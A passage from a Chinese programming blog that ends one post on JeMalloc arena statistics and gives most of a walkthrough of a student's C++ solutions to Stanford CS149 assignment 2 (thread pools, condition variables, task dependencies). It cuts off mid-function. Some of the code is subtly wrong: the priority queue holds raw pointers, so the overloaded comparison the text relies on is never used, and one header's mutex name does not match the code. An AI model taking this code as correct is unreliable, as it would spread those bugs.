src="https://img.lfalive.top/JeMalloc/testjemalloc.png"></p><p><img src="https://img.lfalive.top/JeMalloc/testjemalloc1.png"></p><p><img src="https://img.lfalive.top/JeMalloc/testjemalloc2.png"></p><p><img src="https://img.lfalive.top/JeMalloc/testjemalloc3.png"></p><p>可以看出，arena[0]仍然有一个线程绑定，创建出来的剩下三个arena则已没有线程绑定，因为工作线程已经销毁。对于大小为20000的申请，会分配大小为20480的块，index为37；对于大小为50000的申请，会分配大小为57344的块，index为43。可以看出，arena[1]各使用了13个大小为20480和57344的块，说明工作过程中有13个线程曾经被绑定到该arena。以此类推，arena[2]是2个，arena[3]是1个，相加共16个工作线程。</p>]]></content>
      
      
      <categories>
          
          <category> concurrency </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
            
            <tag> JeMalloc </tag>
            
            <tag> allocator </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS149 - Programming Assignments 2</title>
      <link href="/2022/01/28/CS149-asst2/"/>
      <url>/2022/01/28/CS149-asst2/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>课程链接<a href="https://gfxcourses.stanford.edu/cs149/fall21">https://gfxcourses.stanford.edu/cs149/fall21</a></p><p>项目链接<a href="https://github.com/stanford-cs149/asst2">https://github.com/stanford-cs149/asst2</a></p><p>参考链接<a href="https://github.com/chenxfeng/asst2">https://github.com/chenxfeng/asst2</a></p><p>我的源码<a href="https://github.com/lfalive/asst2">https://github.com/lfalive/asst2</a></p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/stanford-cs149/asst2.git</span><br></pre></td></tr></table></figure><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>修改完善以下文件。</p><ul><li>part_a&#x2F;task_sys.cpp</li><li>part_a&#x2F;task_sys.h</li><li>part_b&#x2F;task_sys.cpp</li><li>part_b&#x2F;task_sys.h</li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在part_a或part_b目录执行<code>make</code>编译后，可以运行单个任务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./runtasks -n 8 mandelbrot_chunked</span><br></pre></td></tr></table></figure><p>也可以执行所有测试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python ../tests/run_test_harness.py</span><br></pre></td></tr></table></figure><p>可选择部分测试运行，可修改运行线程数，使用<code>-h</code>参数查看帮助。</p><p>测试输出中的<code>PERF</code>是实际运行时间与参考解决方案的运行时间的比率。小于1的值表明我们的任务系统实现比参考实现更快。</p><h1 id="part-a"><a href="#part-a" class="headerlink" title="part_a"></a>part_a</h1><p>Synchronous Bulk Task Launch</p><h2 id="Task-System-Parallel-Spawn"><a href="#Task-System-Parallel-Spawn" class="headerlink" title="Task System Parallel Spawn"></a>Task System Parallel Spawn</h2><p>在分配这一步中，将扩展启动程序代码，以并行执行批量任务启动。</p><p>创建额外的线程控制程序来执行批量任务启动的工作。TaskSystem的构造函数提供了一个参数<code>num_threads</code>，它是可以用来运行任务的最大工作线程数。</p><p>本着”先做最简单的事情”的精神，建议在<code>run()</code>开始时生成工作线程，并在<code>run()</code>返回之前<code>join</code>这些线程。这将是一个正确的实现，但它会因频繁创建线程而产生大量开销。</p><p>如何将任务分配给工作线程？应该考虑线程静态或动态的任务分配吗？</p><p>是否有共享变量（任务执行系统的内部状态）需要防止多线程同时访问？可能需要查看C++同步教程，了解C++标准库中的同步原语。</p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>使用<strong>原子操作</strong>，定义一个atomic_int表示taskId，循环所有task，分配给不同线程运行。原子操作保证了同一个task不会被执行多次。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TaskSystemParallelSpawn::<span class="built_in">TaskSystemParallelSpawn</span>(<span class="type">int</span> num_threads) : <span class="built_in">ITaskSystem</span>(num_threads) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;numOfThread = num_threads; <span class="comment">//requiring changes to tasksys.h</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelSpawn::run</span><span class="params">(IRunnable *runnable, <span class="type">int</span> num_total_tasks)</span> </span>&#123;</span><br><span class="line"><span class="function">std::atomic&lt;<span class="type">int</span>&gt; <span class="title">taskId</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">std::thread threads[<span class="keyword">this</span>-&gt;numOfThread];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;thread: threads) &#123;</span><br><span class="line">thread = std::<span class="built_in">thread</span>([&amp;taskId, num_total_tasks, runnable] &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> id = taskId++; id &lt; num_total_tasks; id = taskId++)</span><br><span class="line">runnable-&gt;<span class="built_in">runTask</span>(id, num_total_tasks);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;thread: threads) &#123; thread.<span class="built_in">join</span>(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试，all passed。</p><h2 id="Task-System-Parallel-Thread-Pool-Spinning"><a href="#Task-System-Parallel-Thread-Pool-Spinning" class="headerlink" title="Task System Parallel Thread Pool Spinning"></a>Task System Parallel Thread Pool Spinning</h2><p>每次调用<code>run()</code> 新建和销毁线程的时候，当任务的计算成本很低时，新建和销毁线程的开销尤其明显。此时，建议转移到“线程池”实现，任务执行系统会预先创建所有工作线程（例如在<code>TaskSystem</code>构造期间，或在第一次调用<code>run()</code>时）。</p><ul><li>我们将工作线程设计为循环，始终检查是否还有更多工作要执行（进入while循环直到条件为真的线程通常称为“旋转”）。工作线程如何确定有工作要做？</li><li>现在确保<code>run()</code>实现所需的同步行为并非易事。需要如何更改执行<code>run()</code>才能确定批量任务启动中的所有任务都已完成？</li></ul><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p>在头文件中加入以下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::vector&lt;std::thread&gt; threads;</span><br><span class="line">std::mutex mutex;</span><br><span class="line">std::atomic&lt;<span class="type">int</span>&gt; taskRemained&#123;&#125;;</span><br><span class="line">std::queue&lt;<span class="type">int</span>&gt; taskQueue;</span><br><span class="line">IRunnable *myRunnable&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> exitFlag;</span><br><span class="line"><span class="type">int</span> numTotalTasks&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>threads是系统中的所有线程，mutex和queue实现一个互斥的任务队列，队列元素是taskId。原子变量taskRemained表示剩余任务数。剩余任务清零时<code>run()</code>结束。</p><p>构造函数和析构函数中设置exitFlag，以及创建和销毁线程。线程函数<code>func()</code>中，循环取出任务队列中的任务，如果队列为空，就继续循环。成功执行任务后，原子地使taskRemained递减。<code>run()</code>中，互斥地将所有taskId放入任务队列即可。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TaskSystemParallelThreadPoolSpinning::<span class="built_in">TaskSystemParallelThreadPoolSpinning</span>(<span class="type">int</span> num_threads) : <span class="built_in">ITaskSystem</span>(num_threads) &#123;</span><br><span class="line">exitFlag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_threads; ++i) threads.<span class="built_in">emplace_back</span>(&amp;TaskSystemParallelThreadPoolSpinning::func, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TaskSystemParallelThreadPoolSpinning::~<span class="built_in">TaskSystemParallelThreadPoolSpinning</span>() &#123;</span><br><span class="line">exitFlag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;thread: threads) &#123; thread.<span class="built_in">join</span>(); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSpinning::func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> taskId;</span><br><span class="line"><span class="keyword">while</span> (!exitFlag) &#123;</span><br><span class="line">taskId = <span class="number">-1</span>;</span><br><span class="line">queueMutex.<span class="built_in">lock</span>();</span><br><span class="line"><span class="keyword">if</span> (!taskQueue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">taskId = taskQueue.<span class="built_in">front</span>();</span><br><span class="line">taskQueue.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">queueMutex.<span class="built_in">unlock</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (taskId != <span class="number">-1</span>) &#123;</span><br><span class="line">myRunnable-&gt;<span class="built_in">runTask</span>(taskId, numTotalTasks);</span><br><span class="line">taskRemained--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSpinning::run</span><span class="params">(IRunnable *runnable, <span class="type">int</span> num_total_tasks)</span> </span>&#123;</span><br><span class="line">myRunnable = runnable;</span><br><span class="line">taskRemained = num_total_tasks;</span><br><span class="line">numTotalTasks = num_total_tasks;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_total_tasks; i++) &#123;</span><br><span class="line">queueMutex.<span class="built_in">lock</span>();</span><br><span class="line">taskQueue.<span class="built_in">push</span>(i);</span><br><span class="line">queueMutex.<span class="built_in">unlock</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (taskRemained);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试，all passed。</p><h2 id="Task-System-Parallel-Thread-Pool-Sleeping"><a href="#Task-System-Parallel-Thread-Pool-Sleeping" class="headerlink" title="Task System Parallel Thread Pool Sleeping"></a>Task System Parallel Thread Pool Sleeping</h2><p>第2步实现的缺点之一是线程在“旋转”等待某事执行时会利用CPU内核的资源。例如，工作线程可能会循环等待新任务的到达。作为另一个示例，主线程可能会循环等待工作线程完成所有任务，以便它可以结束<code>run()</code>。 这可能会损害性能，因为CPU资源用于运行这些线程，即使这些线程没有做有用的工作。</p><p>在这部分作业中，希望通过让线程休眠直到满足它们等待的条件来提高任务系统的效率。</p><ul><li>您的实现可以选择使用条件变量来实现此行为。条件变量是一种同步原语，它使线程在等待条件存在时能够休眠（并且不占用 CPU 处理资源）。其他线程“发出信号”等待线程唤醒以查看它们等待的条件是否已满足。例如，如果没有工作要做，您的工作线程可能会进入睡眠状态（因此它们不会从试图做有用工作的线程中占用 CPU 资源）。作为另一个示例，调用的主应用程序线程<code>run()</code>可能希望在等待工作线程完成批量任务启动中的所有任务时休眠。（否则，旋转的主线程会占用工作线程的 CPU 资源！）请参阅<a href="https://github.com/stanford-cs149/asst2/blob/master/tutorial/README.md">C++ 同步教程</a>，了解有关 C++ 中条件变量的更多信息。</li><li>在这部分作业中的实现可能需要考虑棘手的竞争条件，需要考虑许多可能的线程交错行为。</li></ul><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><p>头文件：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">std::vector&lt;std::thread&gt; threads;</span><br><span class="line">std::mutex counterLock;</span><br><span class="line">std::condition_variable counterCond;</span><br><span class="line">std::mutex queueMutex;</span><br><span class="line">std::condition_variable queueCond;</span><br><span class="line">std::queue&lt;<span class="type">int</span>&gt; taskQueue&#123;&#125;;</span><br><span class="line">IRunnable *myRunnable&#123;&#125;;</span><br><span class="line"><span class="type">int</span> taskRemained&#123;&#125;;</span><br><span class="line"><span class="type">int</span> numTotalTasks&#123;&#125;;</span><br><span class="line"><span class="type">bool</span> exitFlag;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>counterLock和counterCond是在task完成后唤醒主线程。queueMutex和taskQueue组成互斥队列，配合queueCond，可以使线程空闲时休眠，不占用资源。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TaskSystemParallelThreadPoolSleeping::<span class="built_in">TaskSystemParallelThreadPoolSleeping</span>(<span class="type">int</span></span><br><span class="line">                                                                           num_threads) : <span class="built_in">ITaskSystem</span>(num_threads) &#123;</span><br><span class="line">   exitFlag = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_threads; ++i) &#123; threads.<span class="built_in">emplace_back</span>(&amp;TaskSystemParallelThreadPoolSleeping::func, <span class="keyword">this</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TaskSystemParallelThreadPoolSleeping::~<span class="built_in">TaskSystemParallelThreadPoolSleeping</span>() &#123;</span><br><span class="line">   exitFlag = <span class="literal">true</span>;</span><br><span class="line">   queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;thread: threads) &#123; thread.<span class="built_in">join</span>(); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSleeping::func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="type">int</span> taskId;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(queueMutex)</span></span>;</span><br><span class="line">         queueCond.<span class="built_in">wait</span>(lock, [] &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;);</span><br><span class="line">         <span class="keyword">if</span> (exitFlag) <span class="keyword">return</span>;</span><br><span class="line">         <span class="keyword">if</span> (taskQueue.<span class="built_in">empty</span>()) <span class="keyword">continue</span>;</span><br><span class="line">         taskId = taskQueue.<span class="built_in">front</span>();</span><br><span class="line">         taskQueue.<span class="built_in">pop</span>();</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      myRunnable-&gt;<span class="built_in">runTask</span>(taskId, numTotalTasks);</span><br><span class="line">      <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(counterLock)</span></span>;</span><br><span class="line">      taskRemained--;</span><br><span class="line">      <span class="keyword">if</span> (taskRemained) queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">      <span class="keyword">else</span> counterCond.<span class="built_in">notify_one</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSleeping::run</span><span class="params">(IRunnable *runnable, <span class="type">int</span> num_total_tasks)</span> </span>&#123;</span><br><span class="line">   myRunnable = runnable;</span><br><span class="line">   taskRemained = num_total_tasks;</span><br><span class="line">   numTotalTasks = num_total_tasks;</span><br><span class="line">   queueMutex.<span class="built_in">lock</span>();</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_total_tasks; i++) &#123; taskQueue.<span class="built_in">push</span>(i); &#125;</span><br><span class="line">   queueMutex.<span class="built_in">unlock</span>();</span><br><span class="line">   queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(counterLock)</span></span>;</span><br><span class="line">      counterCond.<span class="built_in">wait</span>(lock, [] &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;);</span><br><span class="line">      <span class="keyword">if</span> (!taskRemained) <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数中设定exitFlag，创建线程执行<code>func</code>。</p><p><code>func</code>中，线程执行一个大循环。然后进小循环，休眠等待唤醒。被唤醒后就尝试获取任务队列的锁。如果有退出标志，直接结束线程。如果队列为空，继续小循环。否则就取出队头任务，释放锁，然后开始执行任务。执行任务结束后taskRemained递减，如果还剩余任务，就唤醒工作线程，否则唤醒主线程的counterCond，检查是否可以结束<code>run</code>。</p><p><code>run</code>中，必要的初始化后，就开始互斥地将所有任务放进队列，然后唤醒所有工作线程开始工作。任务入队完成后，就开始休眠等待counterCond信号了。</p><p>析构函数中，此时所有工作线程应该都是休眠状态，那么就先设定退出标志，再唤醒所有线程，最后等待所有工作线程结束即可。</p><h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><p>All passed Perf。</p><img src="https://img.lfalive.top/CS149-asst2/resulta1.png" style="zoom:50%;" /><img src="https://img.lfalive.top/CS149-asst2/resulta2.png" style="zoom:50%;" /><img src="https://img.lfalive.top/CS149-asst2/resulta3.png" style="zoom:50%;" /><h1 id="part-b"><a href="#part-b" class="headerlink" title="part_b"></a>part_b</h1><p>扩展part_a任务系统实现，以支持异步启动任务，这些任务可能依赖于以前的任务。这些任务间的依赖关系创建了任务执行时必须遵守的调度约束。</p><p>首先，使用<code>runAsyncWithDeps()</code>创建的任务由任务系统与调用线程异步执行。这意味着<code>runAsyncWithDeps()</code>应该立即返回，即使任务尚未完成执行。该方法返回与此批量任务启动关联的唯一标识符。</p><p>与之前所有批量任务启动相关联的任务完成后，<code>sync()</code>返回。</p><p>part_b支持显式的依赖关系，<code>runAsyncWithDeps()</code>的第三个参数尤为关键：TaskID标识符的向量。它必须引用以前使用的批量任务启动来<code> runAsyncWithDeps()</code>。此向量指定当前批量任务启动中的任务所依赖的先前任务。<strong>因此，在依赖向量中给定的启动中的所有任务完成之前，无法开始执行当前批量任务启动中的任何任务！</strong>很明显，任务调度图是一个有向无环图（DAG）。</p><p>正确实现<code>TaskSystemParallelThreadPoolSleeping::runAsyncWithDeps()</code>和<code>TaskSystemParallelThreadPoolSleeping::sync()</code>，不需要实现part_b中其他TaskSystem。</p><ul><li>考虑以下行为可能会有所帮助：<code>runAsyncWithDeps()</code>一旦将要工作的记录在队列中，就可以返回给调用者。</li><li>在您的实现中拥有两个数据结构会很有帮助：一个表示已通过调用添加到系统中的任务的结构<code>runAsyncWithDeps()</code>，但尚未准备好执行，因为它们依赖于仍在运行的任务（这些任务正在“等待”其他任务完成）。一个未等待任何先前任务完成的“任务就绪队列”，并且可以在工作线程可用于处理它们时安全运行。</li><li>在生成唯一的任务启动 ID 时，不必担心整数溢出。我们不会通过超过2^31个批量任务启动来打击您的任务系统。</li><li>您可以假设所有程序都只会调用<code>run()</code>或仅<code>runAsyncWithDeps()</code>。请注意，此假设意味着您可以实现<code>run()</code>使用适当的调用<code>runAsyncWithDeps()</code>和<code>sync()</code>。</li></ul><h2 id="修改run-test-harness-py"><a href="#修改run-test-harness-py" class="headerlink" title="修改run_test_harness.py"></a>修改run_test_harness.py</h2><p>因为part_b只需要实现Task System Parallel Thread Pool Sleeping，所以在测试时也只需要测试这个系统。</p><img src="https://img.lfalive.top/CS149-asst2/part_b_test.png" style="zoom:50%;" /><p>修改test&#x2F;run_test_harness.py文件，注释掉前三项即可。</p><h2 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h2><p>乍一看很复杂，其实在part_a的Task System Parallel Thread Pool Sleeping上做出一些改动即可。新增了<strong>优先队列</strong>，来维护任务组之间的顺序，保证队首任务组是不依赖其他任务组的或者依赖最少的。还考虑过拓扑排序什么的，有了优先队列，就省事多了。最后效果不错，全pass了。</p><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TaskGroup</span> &#123;</span><br><span class="line">   <span class="type">int</span> groupId;</span><br><span class="line">   IRunnable *runnable;</span><br><span class="line">   <span class="type">int</span> numTotalTasks;</span><br><span class="line">   std::atomic&lt;<span class="type">int</span>&gt; taskRemained&#123;&#125;;</span><br><span class="line">   std::set&lt;TaskID&gt; depending;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">TaskGroup</span>(<span class="type">int</span> groupId, IRunnable *runnable, <span class="type">int</span> numTotalTasks, <span class="type">const</span> std::vector&lt;TaskID&gt; &amp;deps) &#123;</span><br><span class="line">      <span class="keyword">this</span>-&gt;groupId = groupId;</span><br><span class="line">      <span class="keyword">this</span>-&gt;runnable = runnable;</span><br><span class="line">      <span class="keyword">this</span>-&gt;numTotalTasks = numTotalTasks;</span><br><span class="line">      <span class="keyword">this</span>-&gt;taskRemained = numTotalTasks;</span><br><span class="line">      <span class="keyword">this</span>-&gt;depending = &#123;&#125;;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> dep: deps) &#123; <span class="keyword">this</span>-&gt;depending.<span class="built_in">insert</span>(dep); &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> TaskGroup &amp;a, <span class="type">const</span> TaskGroup &amp;b) &#123;</span><br><span class="line">      <span class="keyword">return</span> a.depending.<span class="built_in">size</span>() &gt; b.depending.<span class="built_in">size</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">RunnableTask</span> &#123;</span><br><span class="line">   TaskGroup *belongTo;</span><br><span class="line">   <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">RunnableTask</span>(TaskGroup *belongTo, <span class="type">int</span> id) &#123;</span><br><span class="line">      <span class="keyword">this</span>-&gt;belongTo = belongTo;</span><br><span class="line">      <span class="keyword">this</span>-&gt;id = id;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>引入两个结构体。<code>TaskGroup</code>是每次调用<code>runAsyncWithDeps</code>时会创建的对象，表示一个任务组，包含编号<code>groupId</code>，<code>runnable</code>，总task数<code>numTotalTasks</code>，剩余task数<code>taskRemained</code>（原子变量），依赖任务组集合<code>depending</code>。同时，还重载了小于运算符，这样就能在优先队列中直接按照依赖任务组数从少到多维护。</p><p><code>RunnableTask</code>是放入互斥任务队列<code>taskQueue</code>中的元素，成员是<code>taskId</code>和指向所属<code>TaskGroup</code>对象的指针。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::vector&lt;std::thread&gt; threads;</span><br><span class="line">std::mutex counterLock;</span><br><span class="line">std::condition_variable counterCond;</span><br><span class="line">std::mutex queueMutex;</span><br><span class="line">std::condition_variable queueCond;</span><br><span class="line">std::queue&lt;RunnableTask *&gt; taskQueue;</span><br><span class="line">std::set&lt;TaskGroup *&gt; taskGroupSet;</span><br><span class="line">std::priority_queue&lt;TaskGroup *&gt; taskGroupQueue;</span><br><span class="line"><span class="type">bool</span> exitFlag;</span><br><span class="line"><span class="type">int</span> numGroup;</span><br><span class="line"><span class="type">bool</span> finishFlag&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>相较于part_a，Task System Parallel Thread Pool Sleeping类中新增了一些成员。<code>taskGroupSet</code>中包含所有<code>TaskGroup</code>对象，优先队列<code>taskGroupQueue</code>是解决问题的核心，<code>finishFlag</code>标记是否所有task都已经完成，<code>numGroup</code>表示总group数。</p><h3 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSleeping::run</span><span class="params">(IRunnable *runnable, <span class="type">int</span> num_total_tasks)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">runAsyncWithDeps</span>(runnable, num_total_tasks, &#123;&#125;);</span><br><span class="line">   <span class="built_in">sync</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果调用的是<code>run()</code>，就新建一个没有任何依赖的的任务组，然后调用<code>sync()</code>。</p><h3 id="构造与析构"><a href="#构造与析构" class="headerlink" title="构造与析构"></a>构造与析构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TaskSystemParallelThreadPoolSleeping::<span class="built_in">TaskSystemParallelThreadPoolSleeping</span>(<span class="type">int</span> num_threads) : <span class="built_in">ITaskSystem</span>(num_threads) &#123;</span><br><span class="line">   numGroup = <span class="number">0</span>;</span><br><span class="line">   exitFlag = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_threads; ++i) &#123; threads.<span class="built_in">emplace_back</span>(&amp;TaskSystemParallelThreadPoolSleeping::func, <span class="keyword">this</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TaskSystemParallelThreadPoolSleeping::~<span class="built_in">TaskSystemParallelThreadPoolSleeping</span>() &#123;</span><br><span class="line">   exitFlag = <span class="literal">true</span>;</span><br><span class="line">   queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;thread: threads) &#123; thread.<span class="built_in">join</span>(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和part_a相同，只是多了<code>numGroup</code>的初始化。</p><h3 id="runAsyncWithDeps"><a href="#runAsyncWithDeps" class="headerlink" title="runAsyncWithDeps()"></a>runAsyncWithDeps()</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">TaskID <span class="title">TaskSystemParallelThreadPoolSleeping::runAsyncWithDeps</span><span class="params">(IRunnable *runnable, <span class="type">int</span> num_total_tasks,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                              <span class="type">const</span> std::vector&lt;TaskID&gt; &amp;deps)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">auto</span> newTaskGroup = <span class="keyword">new</span> <span class="built_in">TaskGroup</span>(numGroup, runnable, num_total_tasks, deps);</span><br><span class="line">   taskGroupQueue.<span class="built_in">push</span>(newTaskGroup);</span><br><span class="line">   taskGroupSet.<span class="built_in">insert</span>(newTaskGroup);</span><br><span class="line">   <span class="keyword">return</span> numGroup++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰，构造一个<code>TaskGroup</code>对象，然后将其分别放入优先队列和集合，最后group数递增。</p><h3 id="func"><a href="#func" class="headerlink" title="func()"></a>func()</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSleeping::func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   RunnableTask *task;</span><br><span class="line">   TaskGroup *taskBelongTo;</span><br><span class="line">   <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">         <span class="function">std::unique_lock&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(queueMutex)</span></span>;</span><br><span class="line">         queueCond.<span class="built_in">wait</span>(lock, [] &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;);</span><br><span class="line">         <span class="keyword">if</span> (exitFlag) <span class="keyword">return</span>;</span><br><span class="line">         <span class="keyword">if</span> (taskQueue.<span class="built_in">empty</span>()) <span class="keyword">continue</span>;</span><br><span class="line">         task = taskQueue.<span class="built_in">front</span>();</span><br><span class="line">         taskQueue.<span class="built_in">pop</span>();</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      taskBelongTo = task-&gt;belongTo;</span><br><span class="line">      taskBelongTo-&gt;runnable-&gt;<span class="built_in">runTask</span>(task-&gt;id, taskBelongTo-&gt;numTotalTasks);</span><br><span class="line">      taskBelongTo-&gt;taskRemained--;</span><br><span class="line">      <span class="keyword">if</span> (taskBelongTo-&gt;taskRemained &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">auto</span> taskGroup: taskGroupSet) &#123; taskGroup-&gt;depending.<span class="built_in">erase</span>(taskBelongTo-&gt;groupId); &#125;</span><br><span class="line">         counterCond.<span class="built_in">notify_one</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> queueCond.<span class="built_in">notify_all</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和part_a不同的是，取出<code>RunnableTask</code>对象后，还要找到所述<code>TaskGroup</code>对象，然后再调用<code>runTask()</code>。执行完成后，所属group剩余任务数递减。如果剩余任务数不大于0，则表示该任务组的所有任务已完成，循环所有<code>TaskGroup</code>，在<code>depending</code>集合中删除当前任务组。这是，优先队列会自动维护。</p><h3 id="sync"><a href="#sync" class="headerlink" title="sync()"></a>sync()</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskSystemParallelThreadPoolSleeping::sync</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   TaskGroup *nowTaskGroup;</span><br><span class="line">   RunnableTask *nowRunnableTask;</span><br><span 